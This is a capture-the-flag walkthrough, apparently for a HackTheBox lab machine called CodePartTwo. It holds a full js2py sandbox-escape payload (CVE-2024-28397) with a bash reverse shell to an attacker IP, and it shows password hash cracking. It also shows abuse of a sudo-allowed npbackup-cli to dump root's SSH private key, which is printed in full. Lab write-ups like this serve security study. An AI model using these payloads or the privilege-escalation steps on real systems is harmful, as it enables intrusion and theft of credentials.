### Nmap
```
nmap -sV -sC -vv 10.10.11.82

---OUTPUT---
Nmap scan report for 10.10.11.82
Host is up, received reset ttl 63 (0.024s latency).
Scanned at 2025-12-13 12:11:08 EST for 7s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnwmWCXCzed9BzxaxS90h2iYyuDOrE2LkavbNeMlEUPvMpznuB9cs8CTnUenkaIA8RBb4mOfWGxAQ6a/nmKOea1FA6rfGG+fhOE/R1g8BkVoKGkpP1hR2XWbS3DWxJx3UUoKUDgFGSLsEDuW1C+ylg8UajGokSzK9NEg23WMpc6f+FORwJeHzOzsmjVktNrWeTOZthVkvQfqiDyB4bN0cTsv1mAp1jjbNnf/pALACTUmxgEemnTOsWk3Yt1fQkkT8IEQcOqqGQtSmOV9xbUmv6Y5ZoCAssWRYQ+JcR1vrzjoposAaMG8pjkUnXUN0KF/AtdXE37rGU0DLTO9+eAHXhvdujYukhwMp8GDi1fyZagAW+8YJb8uzeJBtkeMo0PFRIkKv4h/uy934gE0eJlnvnrnoYkKcXe+wUjnXBfJ/JhBlJvKtpLTgZwwlh95FJBiGLg5iiVaLB2v45vHTkpn5xo7AsUpW93Tkf+6ezP+1f3P7tiUlg3ostgHpHL5Z9478=
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBErhv1LbQSlbwl0ojaKls8F4eaTL4X4Uv6SYgH6Oe4Y+2qQddG0eQetFslxNF8dma6FK2YGcSZpICHKuY+ERh9c=
|   256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEJovaecM3DB4YxWK2pI7sTAv9PrxTbpLG2k97nMp+FM
8000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
![[Pasted image 20251213123912.png]]
- There is a basic repo of the app which I can download and I find a users.db. I am guessing I need to access this when breaking out of the sandbox
![[Pasted image 20251213143142.png]]
- Also js2py is installed:
![[Pasted image 20251213144532.png]]
- I also find an appsecretkey:`S3cr3tK3yC0d3PartTw0`
![[Pasted image 20251213145223.png]]

- I register as user `test:test` and login to find the sandbox:
![[Pasted image 20251213143231.png]]
- Requires Javascript code.

- Online i find a sandbox escape: CVE-2024-28397  
https://github.com/harutomo-jp/CVE-2024-28397-RCE
- I can run this exploit and grab a shell on listener:
```
python exploit.py 10.10.11.82:8000 /run_code --local_ip 10.10.14.21 --local_port 9999
```
![[Pasted image 20251213151906.png]]

- Or I can directly pass the exploit on the browser:
```
// Command to execute on the host (reverse shell payload)
let cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.21/9999 0>&1'"

// Variable declarations (names are intentionally opaque, as in the original exploit)
let hacked, bymarve, n11
let getattr, obj

// Obtain property names from a plain JS object
// In this sandbox, this object is backed by a Python object
hacked = Object.getOwnPropertyNames({});

// Indirectly access Python's __getattribute__ method
// This avoids direct access restrictions on magic attributes
bymarve = hacked.__getattribute__;

// Use __getattribute__ to retrieve itself
n11 = bymarve("__getattribute__");

// Traverse the Python object model:
// __class__ gives the object's class
// __base__ gives the base class (Python's built-in 'object')
obj = n11("__class__").__base__;

// Store object.__getattribute__ for convenience (not strictly required)
getattr = obj.__getattribute__;

// Recursive function to walk Python's class hierarchy
// Searches for subprocess.Popen among all subclasses of object
function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i];

        // Check if this class is subprocess.Popen
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item;
        }

        // Recurse into subclasses (skip 'type' to avoid infinite recursion)
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result;
        }
    }
}

// Invoke subprocess.Popen directly with shell=True
// Arguments correspond to Python's Popen constructor
n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();

// Output the result of the command execution
console.log(n11);

// Return the result to the sandbox
n11

```
![[Pasted image 20251213152000.png]]

- As user app I can read the users.db to find the MD5 hash of marco which I can crack from crackstation.net
```
sqlite3 users.db .dump

---OUTPUT---
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
);
INSERT INTO user VALUES(1,'marco','649c9d65a206a75f5abe509fe128bce5');
INSERT INTO user VALUES(2,'app','a97588c0e2fa3a024876339e27aeb42e');
INSERT INTO user VALUES(3,'test','098f6bcd4621d373cade4e832627b4f6');
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
);
COMMIT;
```
![[Pasted image 20251213152442.png]]
![[Pasted image 20251213152503.png]]

- I can ssh into target as `marco:sweetangelbabylove`
```
ssh marco@codeparttwo.htb
Password: sweetangelbabylove
```
![[Pasted image 20251213152606.png]]

- I grab user flag:
![[Pasted image 20251213152810.png]]

- Checking sudo privilegs:
```
sudo -l

---OUTPUT---
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```
![[Pasted image 20251213152844.png]]

- I read the file in : `/usr/local/bin/npbackup-cli`
```
cat /usr/local/bin/npbackup-cli

---OUTPUT---
#!/usr/bin/python3
# -*- coding: utf-8 -*-
import re
import sys
from npbackup.__main__ import main
if __name__ == '__main__':
    # Block restricted flag
    if '--external-backend-binary' in sys.argv:
        print("Error: '--external-backend-binary' flag is restricted for use.")
        sys.exit(1)

    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```
![[Pasted image 20251213152943.png]]

- Also checking id I am part of group backups:
![[Pasted image 20251213153008.png]]

- There is a folder in `/opt` which is owned by root and group backups. I can now access it:
![[Pasted image 20251213153045.png]]
- But there is nothing inside.

- Looking online I find an exploit that gives the config file (https://github.com/AliElKhatteb/npbackup-cli-priv-escalation). I edit it to give the path fo root (can add more like `/etc/shadow`)
```
conf_version: 3.0.1
audience: public

repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
        - /root
      source_type: folder_list
      exclude_files_larger_than: 0.0
      exclude_files: []
      minimum_backup_size_error: 0 B
      compression: auto
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      additional_parameters: []
      additional_backup_only_parameters: []
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
      prune_max_unused: 0 B
      prune_max_repack_size: 
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false

groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      tags: []
      compression: auto
      use_fs_snapshot: false
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files: []
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters: []
      additional_backup_only_parameters: []
      minimum_backup_size_error: 0 B
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false

identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:

global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false

global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```
- Then using the sudo command I execute this to backup a snapshot:
```
sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf --backup


---OUTPUT---
2025-12-13 21:13:59,100 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-12-13 21:13:59,138 :: INFO :: Loaded config FD1646D6 in /tmp/npbackup.conf
2025-12-13 21:13:59,151 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2025-12-13 21:14:01,311 :: INFO :: Snapshots listed successfully
2025-12-13 21:14:01,312 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
2025-12-13 21:14:01,312 :: INFO :: Runner took 2.161238 seconds for has_recent_snapshot
2025-12-13 21:14:01,312 :: INFO :: Running backup of ['/root'] to repo default
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 0 B   (0 B   stored)

processed 15 files, 197.660 KiB in 0:00
snapshot e21fc82f saved
2025-12-13 21:14:03,614 :: INFO :: Backend finished with success
2025-12-13 21:14:03,617 :: INFO :: Processed 197.7 KiB of data
2025-12-13 21:14:03,617 :: INFO :: Operation finished with success
2025-12-13 21:14:03,618 :: INFO :: Runner took 4.468328 seconds for backup
2025-12-13 21:14:03,618 :: INFO :: Operation finished
2025-12-13 21:14:03,624 :: INFO :: ExecTime = 0:00:04.526991, finished, state is: success.
```
![[Pasted image 20251213162624.png]]

- I then grab root's `id_rsa` key with the path and snapshot id from the output of last command:
```
sudo /usr/local/bin/npbackup-cli -c npbackup.conf --dump /root/.ssh/id_rsa --snapshot-id e21fc82f

---OUTPUT---
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
![[Pasted image 20251213162653.png]]
- I copy the key locally, add the permissions and log into target as root:
![[Pasted image 20251213162724.png]]
```
vi root_id_rsa            # Copy key here
chmod 0600 root_id_rsa
ssh root@codeparttwo.htb -i root_id_rsa
```
![[Pasted image 20251213162020.png]]

- I grab root flag:
![[Pasted image 20251213162041.png]]